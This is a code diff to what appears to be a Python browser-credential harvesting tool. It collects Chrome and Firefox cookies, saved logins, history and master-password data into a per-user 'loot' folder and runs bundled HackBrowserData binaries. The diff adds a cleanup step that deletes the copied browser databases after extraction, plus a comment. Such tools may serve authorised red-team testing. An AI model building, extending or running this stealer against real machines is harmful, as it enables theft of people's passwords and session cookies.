@@ -56,6 +56,15 @@ def delete_if_empty(filename: str) -> bool:
 	return True
 
 
+def cleanup():
+	directory = f"{script_path}/loot/{user}"
+	os.chdir(directory)
+	dbs = ['Cookies', 'cookies.sqlite', 'Login Data', 'logins.json', 'History', 'places.sqlite']
+	for db in dbs:
+		if os.path.isfile(db):
+			os.remove(db)
+
+
 def get_data(browser_dict: dict, cookies=None, logins=False, history=False, masterpass=None):
 	os.chdir(loot_dir)
 	chrome_profiles = browser_dict['chrome']
@@ -200,6 +209,7 @@ if __name__ == '__main__':
 			if not os.path.isfile(options.logins_path):
 				err('Check logins path')
 		get_data(profile_dirs, logins=True)
+	# Get All (using golang binaries under './tools/hackbrowserdata'):
 	if options.all_true:
 		hackbrowserdata = os.path.abspath(f"tools/hackbrowserdata/hbd-{info.platform}-{info.arch}")
 		if info.platform == 'Windows':
@@ -211,6 +221,7 @@ if __name__ == '__main__':
 			shutil.move(os.path.join(f"{script_path}/loot/{user}/results/{file}"), os.path.join(f"{script_path}/loot/{user}/{file}"))
 		os.rmdir('./results')
 
+	cleanup()
 	div()
 	print(f"Contents of {script_path}/loot/{user}:\n")
 	for file in os.listdir(f"{script_path}/loot/{user}"):
